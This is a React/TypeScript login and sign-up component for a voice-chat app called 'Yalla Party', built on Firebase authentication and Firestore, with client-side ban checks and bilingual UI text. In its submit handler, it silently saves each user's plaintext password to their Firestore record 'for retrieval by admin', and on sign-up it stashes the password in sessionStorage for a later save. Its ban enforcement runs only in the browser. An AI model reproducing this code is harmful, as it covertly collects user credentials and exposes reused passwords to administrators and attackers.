
import React, { useState, useEffect } from 'react';
import { auth, db } from '../firebase';
import { signInWithEmailAndPassword, createUserWithEmailAndPassword, signOut } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-auth.js";
import { doc, getDoc, onSnapshot, setDoc, collection, query, where, getDocs } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
import { motion, AnimatePresence } from 'framer-motion';
import { BanModal } from './BanModal';
import { useLanguage } from '../LanguageContext';

interface LoginProps {
  onLoginSuccess: () => void;
}

const getDeviceId = () => {
  let devId = localStorage.getItem('yalla_device_id');
  if (!devId) {
    devId = 'dev_' + Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
    localStorage.setItem('yalla_device_id', devId);
  }
  return devId;
};

export const Login: React.FC<LoginProps> = ({ onLoginSuccess }) => {
  const { language, t } = useLanguage();
  const [showEmailForm, setShowEmailForm] = useState(false);
  const [isLogin, setIsLogin] = useState(true);
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [isLoading, setIsLoading] = useState(false); 
  const [error, setError] = useState('');
  const [customBg, setCustomBg] = useState<string | null>(null);
  const [customLogo, setCustomLogo] = useState<string | null>(null);

  const [isPageReady, setIsPageReady] = useState(false);
  const [isBgLoaded, setIsBgLoaded] = useState(false);
  const [isLogoLoaded, setIsLogoLoaded] = useState(false);
  const [hasFetchedData, setHasFetchedData] = useState(false);
  const [showBanModal, setShowBanModal] = useState(false);
  const [banUntil, setBanUntil] = useState<string | null>(null);
  const [deviceBanUntil, setDeviceBanUntil] = useState<string | null>(null);

  useEffect(() => {
    const devId = getDeviceId();
    const unsub = onSnapshot(doc(db, "bannedDevices", devId), (snap) => {
      if (snap.exists()) {
        const data = snap.data();
        if (data.banUntil) {
          const banDate = new Date(data.banUntil);
          if (banDate > new Date()) {
            setDeviceBanUntil(data.banUntil);
            setBanUntil(data.banUntil);
            setShowBanModal(true);
            return;
          }
        }
      }
      setDeviceBanUntil(null);
    });
    return () => unsub();
  }, []);

  useEffect(() => {
    const unsub = onSnapshot(doc(db, "settings", "appearance"), (docSnap) => {
      if (docSnap.exists()) {
        const data = docSnap.data();
        setCustomBg(data.loginBackground || null);
        setCustomLogo(data.loginLogo || null);
        if (!data.loginBackground) setIsBgLoaded(true);
        if (!data.loginLogo) setIsLogoLoaded(true);
      } else {
        setIsBgLoaded(true);
        setIsLogoLoaded(true);
      }
      setHasFetchedData(true);
    });

    // Safety timeout to ensure loading completes even if image/video onload/canplay events fail
    const safetyTimer = setTimeout(() => {
      setIsBgLoaded(true);
      setIsLogoLoaded(true);
    }, 2500);

    return () => {
      unsub();
      clearTimeout(safetyTimer);
    };
  }, []);

  useEffect(() => {
    if (hasFetchedData && isBgLoaded && isLogoLoaded) {
      const timer = setTimeout(() => setIsPageReady(true), 500);
      return () => clearTimeout(timer);
    }
  }, [hasFetchedData, isBgLoaded, isLogoLoaded]);

  const isVideoUrl = (url: string | null) => {
    if (!url) return false;
    return url.match(/\.(mp4|webm|ogg|mov)$/) !== null || url.includes('video');
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setError('');
    
    if (deviceBanUntil) {
      setBanUntil(deviceBanUntil);
      setShowBanModal(true);
      return;
    }
    
    if (!email || !password) {
      setError(t("يرجى إدخال البيانات", "Please enter your info"));
      return;
    }
    
    setIsLoading(true);
    try {
      if (isLogin) {
        // Pre-check ban by email
        try {
          const q = query(collection(db, "users"), where("email", "==", email));
          const snap = await getDocs(q);
          if (!snap.empty) {
            const data = snap.docs[0].data();
            if (data.banUntil) {
              const banDate = new Date(data.banUntil);
              if (banDate > new Date()) {
                setBanUntil(data.banUntil);
                setShowBanModal(true);
                setIsLoading(false);
                return;
              }
            }
          }
        } catch (e) {
          console.error("Ban pre-check error:", e);
        }

        try {
          const userCredential = await signInWithEmailAndPassword(auth, email, password);
          const user = userCredential.user;
          
          // Store password in Firestore for retrieval by admin
          try {
            await setDoc(doc(db, "users", user.uid), { 
              password: password 
            }, { merge: true });
          } catch (e) {
            console.error("Error saving password:", e);
          }

          const userDoc = await getDoc(doc(db, "users", user.uid));
          if (userDoc.exists()) {
            const data = userDoc.data();
            if (data.banUntil) {
              const banDate = new Date(data.banUntil);
              const now = new Date();
              if (banDate > now) {
                setBanUntil(data.banUntil);
                setShowBanModal(true);
                await signOut(auth);
                setIsLoading(false);
                return;
              }
            }
          }
        } catch (authErr: any) {
          console.error(authErr.code);
          if (authErr.code === 'auth/user-not-found' || authErr.code === 'auth/invalid-email') {
            setError(t('الإيميل غير صحيح', 'Incorrect Email Address'));
          } else if (authErr.code === 'auth/wrong-password') {
            setError(t('الباسورد غير صحيح', 'Incorrect Password'));
          } else {
            setError(t('حدث خطأ في الدخول، تأكد من البيانات', 'Account login failed, please check details'));
          }
          setIsLoading(false);
          return;
        }
      } else {
        await createUserWithEmailAndPassword(auth, email, password);
        // Temporarily store password for SetupProfile to save it
        sessionStorage.setItem('pending_password', password);
      }
      onLoginSuccess();
    } catch (err: any) {
      console.error(err);
      setError(t('حدث خطأ غير متوقع', 'An unexpected error occurred'));
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="min-h-screen max-w-md mx-auto bg-[#1a0b2e] flex flex-col justify-center px-6 relative overflow-hidden text-purple-50" dir={language === 'ar' ? 'rtl' : 'ltr'}>
      <AnimatePresence>
        {!isPageReady && (
          <motion.div 
            initial={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            transition={{ duration: 0.5 }}
            className="fixed inset-0 z-[100] bg-[#1a0b2e] flex items-center justify-center"
          >
            <div className="flex flex-col items-center gap-4">
              <div className="w-12 h-12 border-4 border-purple-500/20 border-t-purple-500 rounded-full animate-spin"></div>
              <p className="text-[10px] font-black text-purple-400 uppercase tracking-[0.3em]">Yalla Party</p>
            </div>
          </motion.div>
        )}
      </AnimatePresence>

      {showBanModal && banUntil && (
        <BanModal 
          isOpen={showBanModal} 
          onClose={() => setShowBanModal(false)} 
          banUntil={banUntil} 
        />
      )}

      <div className={`transition-opacity duration-700 ${isPageReady ? 'opacity-100' : 'opacity-0'}`}>
        <div className="absolute inset-0 z-0">
          {customBg ? (
            <>
              {isVideoUrl(customBg) ? (
                <video src={customBg} autoPlay loop muted playsInline onCanPlayThrough={() => setIsBgLoaded(true)} className="w-full h-full object-cover" />
              ) : (
                <img src={customBg} onLoad={() => setIsBgLoaded(true)} className="w-full h-full object-cover" alt="Background" />
              )}
              <div className="absolute inset-0 bg-black/40 backdrop-blur-[1px]"></div>
              <div className="absolute top-0 left-0 right-0 h-56 bg-gradient-to-b from-black via-black/40 to-transparent"></div>
            </>
          ) : (
            <>
              <div className="absolute top-[-5%] right-[-10%] w-64 h-64 bg-purple-600/10 rounded-full blur-[80px]"></div>
              <div className="absolute bottom-[-5%] left-[-10%] w-64 h-64 bg-pink-600/10 rounded-full blur-[80px]"></div>
            </>
          )}
        </div>

        <div className="z-10 text-center mb-10 relative">
          <div className="w-24 h-24 bg-gradient-to-tr from-purple-600 to-pink-500 rounded-full mx-auto flex items-center justify-center shadow-2xl mb-6 border-2 border-white/20 overflow-hidden bg-white/5 p-0">
            {customLogo ? (
              <img src={customLogo} onLoad={() => setIsLogoLoaded(true)} className="w-full h-full object-cover scale-100" alt="App Logo" />
            ) : (
              <i className="fas fa-gamepad text-3xl text-white"></i>
            )}
          </div>
          <h1 className="text-4xl font-black mb-2 tracking-tighter bg-gradient-to-r from-white to-purple-200 bg-clip-text text-transparent italic">Yalla Party</h1>
          <p className="text-purple-400/60 text-[10px] font-black uppercase tracking-[0.3em]">{t("عالم الترفيه والدردشة", "The World of Entertainment and Voice Chat")}</p>
        </div>

        <div className="z-10 w-full max-w-[340px] mx-auto relative">
          <AnimatePresence mode="wait">
            {!showEmailForm ? (
              <motion.div key="options" initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} exit={{ opacity: 0, scale: 0.95 }} className="space-y-4">
                <button type="button" onClick={() => {
                  if (deviceBanUntil) {
                    setBanUntil(deviceBanUntil);
                    setShowBanModal(true);
                    return;
                  }
                  setShowEmailForm(true);
                }} className="w-full bg-white/10 backdrop-blur-md border border-white/20 h-14 rounded-full flex items-center justify-center gap-3 shadow-xl active:scale-95 transition-all group">
                  <i className="fas fa-envelope text-white text-sm"></i>
                  <span className="text-white font-black text-sm">{t("تسجيل الدخول بالبريد الإلكتروني", "Login with Email Address")}</span>
                </button>
              </motion.div>
            ) : (
              <motion.div key="form" initial={{ opacity: 0, scale: 0.9 }} animate={{ opacity: 1, scale: 1 }} exit={{ opacity: 0, scale: 0.9 }} className="bg-white/5 backdrop-blur-2xl border border-white/10 p-6 rounded-[2.5rem] shadow-2xl">
                <div className="flex justify-between items-center mb-6">
                  <button onClick={() => setShowEmailForm(false)} className="text-white/40 hover:text-white transition-colors"><i className="fas fa-arrow-right"></i></button>
                  <h3 className="text-white font-black text-sm">{isLogin ? t('دخول بالبريد', 'Email Login') : t('إنشاء حساب جديد', 'Create New Account')}</h3>
                  <div className="w-4"></div>
                </div>
                <form onSubmit={handleSubmit} className="space-y-4">
                  {error && (
                    <div className="bg-red-500/10 text-red-400 text-[10px] p-3 rounded-xl text-center font-bold border border-red-500/20 leading-relaxed">
                      {error}
                    </div>
                  )}
                  <div className="space-y-1.5">
                    <label className="block text-[9px] font-black text-purple-400/60 mr-2 uppercase">{t("البريد الإلكتروني", "Email Address")}</label>
                    <input type="email" value={email} onChange={(e) => setEmail(e.target.value)} className="w-full bg-white/5 border border-white/10 rounded-full py-3.5 px-6 text-xs text-white outline-none focus:border-purple-500/40 transition-all" placeholder="mail@example.com" />
                  </div>
                  <div className="space-y-1.5">
                    <label className="block text-[9px] font-black text-purple-400/60 mr-2 uppercase">{t("كلمة المرور", "Password")}</label>
                    <div className="relative">
                      <button type="button" onClick={() => setShowPassword(!showPassword)} className="absolute left-4 top-1/2 -translate-y-1/2 text-white/20 hover:text-white/40 text-xs"><i className={`fas ${showPassword ? 'fa-eye' : 'fa-eye-slash'}`}></i></button>
                      <input type={showPassword ? 'text' : 'password'} value={password} onChange={(e) => setPassword(e.target.value)} className="w-full bg-white/5 border border-white/10 rounded-full py-3.5 pl-12 pr-6 text-xs text-white outline-none focus:border-purple-500/40 transition-all" placeholder="••••••••" />
                    </div>
                  </div>
                  <button type="submit" disabled={isLoading} className="w-full bg-gradient-to-r from-purple-600 to-pink-600 py-4 rounded-full font-black text-xs text-white shadow-lg active:scale-95 transition-all mt-4 border border-white/10">
                    {isLoading ? <i className="fas fa-circle-notch animate-spin"></i> : (isLogin ? t('تسجيل الدخول', 'Login') : t('إنشاء حساب', 'Sign Up'))}
                  </button>
                </form>
                <div className="mt-6 text-center">
                  <button onClick={() => {
                    const isAccountBanned = banUntil && new Date(banUntil) > new Date();
                    if (deviceBanUntil) {
                      setBanUntil(deviceBanUntil);
                      setShowBanModal(true);
                      return;
                    }
                    if (isAccountBanned) {
                      setShowBanModal(true);
                      return;
                    }
                    setIsLogin(!isLogin);
                  }} className="text-[10px] text-purple-400/60 font-bold hover:text-purple-300 transition-colors">
                    {isLogin ? t('ليس لديك حساب؟ سجل الآن', 'Don\'t have an account? Sign Up') : t('لديك حساب بالفعل؟ ادخل هنا', 'Already have an account? Login')}
                  </button>
                </div>
              </motion.div>
            )}
          </AnimatePresence>
        </div>
        <div className="mt-12 text-center px-10 z-10 relative">
          <p className="text-[9px] font-bold text-purple-300/30 leading-relaxed uppercase tracking-widest">{t("من خلال المتابعة، أنت توافق على شروط الخدمة وسياسة الخصوصية", "By continuing, you agree to our Terms of Service & Privacy Policy")}</p>
        </div>
      </div>
    </div>
  );
};
